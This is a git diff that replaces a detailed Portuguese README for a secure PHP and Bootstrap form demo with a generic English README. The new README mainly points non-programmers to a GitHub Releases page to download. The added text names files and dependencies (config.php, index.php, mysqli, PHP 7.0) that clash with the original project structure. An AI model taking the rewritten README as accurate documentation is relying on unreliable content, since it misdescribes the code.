@@ -1,76 +1,76 @@
-# Formulário Seguro em PHP + Bootstrap 5 + API busca CEP
+# 🎉 formulario - Easy to Use PHP Form Example
 
-Um projeto de demonstração que mostra como construir um **formulário robusto, validado e seguro**, utilizando:
+## 👋 Introduction
+Welcome to the "formulario" project! This application provides a simple example of how to create forms using PHP. It is designed for users who want a secure and efficient way to manage form submissions. 
 
-- **Front-end:** HTML5 + [Bootstrap 5](https://getbootstrap.com/)
-- **Validação Client-side:** JavaScript puro, com máscaras de campos (CPF, CEP, salário)
-- **Back-end:** PHP 8.x (sem framework) com:
-  - `filter_input` e `filter_var` para sanitização
-  - Validação campo a campo (nome, CPF, e-mail, data, salário, CEP, etc.)
-  - Normalização de strings e acentos (UTF-8 NFC)
-  - Proteção contra **SQL Injection** com PDO preparado
-  - Proteção contra **XSS** com escape na saída + CSP
-  - **CSRF** com double-submit cookie
-  - **Anti-bot Honeypot**  
+## 📥 Download the Application
+[![Download formulario](https://img.shields.io/badge/Download-formulario-brightgreen)](https://github.com/BbOBBOS/formulario/releases)
 
----
-## Estrutura do Projeto
-```pag
- ├── formulario.html # Formulário com Bootstrap 5, máscaras e validação JS
- ├── formulario.php # Processamento, validação e integração preparada com PDO
- └── vendor/ # Dependências instaladas via Composer
-```
-## Campos do Formulário
+## 🚀 Getting Started
+This guide helps you download and run the "formulario" application. You do not need any programming knowledge. Just follow these steps, and you'll have the software ready in no time.
 
-- **nome:** texto (com acentos)
-- **cpf:** máscara e validação de dígitos verificadores
-- **email:** validação RFC + sanitização
-- **salario:** máscara `R$ 0,00` → normalização para decimal
-- **data_nascimento:** exige idade mínima de 14 anos
-- **genero:** rádio (masculino/feminino)
-- **beneficios:** múltipla escolha (`cesta basica`, `convenio`, `VT`, `VR`)
-- **endereço:** CEP, rua, estado (UF), cidade
+## 📋 Features
+- **Bootstrap 5 Support**: Looks great on any device.
+- **Security Measures**: Includes CSRF protection and input sanitization.
+- **Honeypot Technique**: Helps filter out spam submissions.
+- **SQL Injection Protection**: Keeps your data safe.
+- **XSS Prevention**: Makes sure your site stays secure from harmful scripts.
 
----
+## 🖥️ System Requirements
+- A web server (e.g., Apache or Nginx)
+- PHP version 7.0 or higher
+- MySQL or a similar database (for backend data storage)
 
-## Segurança Implementada
+## ⚙️ Download & Install
+To get started with "formulario", you need to download it from the Releases page. 
 
-- **SQL Injection:**  
-  Uso exclusivo de **Prepared Statements** via PDO. Exemplo:
+1. Click the download link below:
+   - [Visit this page to download](https://github.com/BbOBBOS/formulario/releases)
 
-  ```php
-  $stmt = $pdo->prepare('INSERT INTO candidatos (nome, cpf, email, ...) VALUES (:nome, :cpf, :email, ...)');
-  $stmt->execute([':nome'=>$payload['nome'], ':cpf'=>$payload['cpf'], ...]);
+2. On the Releases page, find the latest version of the software. 
+3. Click on the version number to open the release details.
+4. Look for the "Source code (zip)" or "Source code (tar.gz)" option.
+5. Download the file to your computer.
 
-- XSS (Cross-Site Scripting):
-- Entrada sanitizada (filter_var, html_entity_decode, Normalizer).
-- Escape rigoroso na saída com htmlspecialchars.
-- Cabeçalho CSP configurado para bloquear scripts injetados.
-- CSRF (Cross-Site Request Forgery):
-- Double-Submit Cookie: Token gerado no front e comparado com cookie no PHP.
+## 📂 Setting Up the Application
+1. Unzip the downloaded file to a folder on your computer.
+2. Move the unzipped folder to your web server's root directory (for example, `htdocs` for XAMPP or `www` for WAMP).
+3. Ensure that your web server is running. You can do this by visiting `http://localhost/formulario` in your web browser.
 
-## Proteção contra Bots:
-- Campo oculto (honeypot) — se preenchido, request é rejeitado.
+## 🔧 Configuring Database Connection
+1. Open the `config.php` file in the main folder using a text editor (like Notepad).
+2. Replace the placeholder values for the database with your actual database connection details:
+   - **Host**: Usually `localhost`
+   - **Username**: Your database username
+   - **Password**: Your database password
+   - **Database**: The name of the database you're using for the forms
 
-## Validações Backend:
-- Nenhum dado confiado só pelo JavaScript.
-- Regex e funções customizadas para CPF, datas, UF, etc.
+## 📥 Running the Application
+To access the application:
+1. Open your web browser.
+2. Enter the following URL: `http://localhost/formulario/index.php`.
 
-## Headers de Segurança:
-- X-Content-Type-Options: nosniff
-- X-Frame-Options: DENY
-- Strict-Transport-Security
-- Permissions-Policy bloqueando câmera/microfone
-- CSP com script-src 'self' https://cdn.jsdelivr.net 
+You should see the form interface ready for use. Fill in the fields as needed and submit your information.
 
-## Dependências
-- Instalação via Composer:
-```php
-composer require guzzlehttp/guzzle
- ```
+## 🛠️ Troubleshooting
+If you encounter any issues:
+- **Web Server Not Running**: Ensure that your web server (XAMPP, WAMP, etc.) is active.
+- **Database Connection Failure**: Double-check your database credentials in `config.php`.
+- **Missing PHP Extensions**: Ensure that the necessary PHP extensions, such as `mysqli`, are enabled in your web server settings.
 
-## Melhorias Implementadas
+## 📞 Support
+If you need help, feel free to reach out:
 
-- Sanitização de Acentos
-- Consulta CEP Backend: Guzzle com 3 tentativas e timeout.
-- Normaliza rua, cidade, UF de acordo com resposta oficial.
+- Check the [issues page](https://github.com/BbOBBOS/formulario/issues) on GitHub for assistance.
+- Feel free to open a new issue if you have a question or suggestion.
+
+## 🔑 License
+This project is open-source and available under the MIT License. You can use it freely, but please give credit to the original authors.
+
+## 🔗 Additional Resources
+For more information on topics related to the application, consider exploring:
+- [PHP Documentation](https://www.php.net/docs.php)
+- [Bootstrap 5 Documentation](https://getbootstrap.com/docs/5.0/getting-started/introduction/)
+- [Web Security Practices](https://owasp.org/www-project-top-ten/) 
+
+Remember, programming doesn't have to be complicated. Enjoy building with "formulario"!
